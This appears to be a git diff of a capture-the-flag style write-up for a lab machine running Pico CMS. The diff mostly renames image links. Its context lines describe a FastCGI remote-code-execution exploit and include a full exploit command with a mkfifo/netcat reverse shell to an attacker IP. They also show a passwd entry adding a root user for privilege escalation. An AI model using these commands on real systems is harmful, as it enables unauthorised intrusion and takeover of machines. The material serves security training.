@@ -36,7 +36,7 @@ Port 8000 was running Pico CMS, which does have some exploits.
 
 Port 80 had a countdown:
 
-![](<../../../.gitbook/assets/image%20(985).png>)
+![](../../../.gitbook/assets/planetexpress-6.png)
 
 There isn't much on this page, so we can do a `gobuster` directory scan with the PHP extension since PicoCMS was being used:
 
@@ -97,11 +97,11 @@ locale: ~
 
 There's also a custom plugin developed for this website, and we can visit that at `plugins/PicoTest.php` based on the Github repo. This would show us the PHPInfo of the site:
 
-![](<../../../.gitbook/assets/image%20(292).png>)
+![](../../../.gitbook/assets/planetexpress-4.png)
 
 Here, we can find that `/var/www/html/planetexpress` is the document root. Also, we can find a lot of disabled functions:
 
-![](<../../../.gitbook/assets/image%20(314).png>)
+![](../../../.gitbook/assets/planetexpress-5.png)
 
 ### FastCGI -> RCE
 
@@ -113,7 +113,7 @@ There are RCE exploits for this service [here](https://gist.github.com/phith0n/9
 
 Using `passthru` and the document root directory allows us to get RCE:
 
-![](<../../../.gitbook/assets/image%20(1215).png>)
+![](../../../.gitbook/assets/planetexpress-1.png)
 
 We can then get a reverse shell via the `mkfifo` one-liner.
 
@@ -121,7 +121,7 @@ We can then get a reverse shell via the `mkfifo` one-liner.
 $ python2 exploit.py -c '<?php passthru("bash -c \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.45.218 80 > /tmp/f\""); ?>' 192.168.183.205 /var/www/html/planetexpress/plugins/PicoTest.php
 ```
 
-![](<../../../.gitbook/assets/image%20(1232).png>)
+![](../../../.gitbook/assets/planetexpress-2.png)
 
 ## Privilege Escalation
 
@@ -203,6 +203,6 @@ root:neverwant2saygoodbye:0:0:root:/root:/bin/bash
 
 We can then `ssh` in as `root`:
 
-![](<../../../.gitbook/assets/image%20(1567).png>)
+![](../../../.gitbook/assets/planetexpress-3.png)
 
 Rooted!
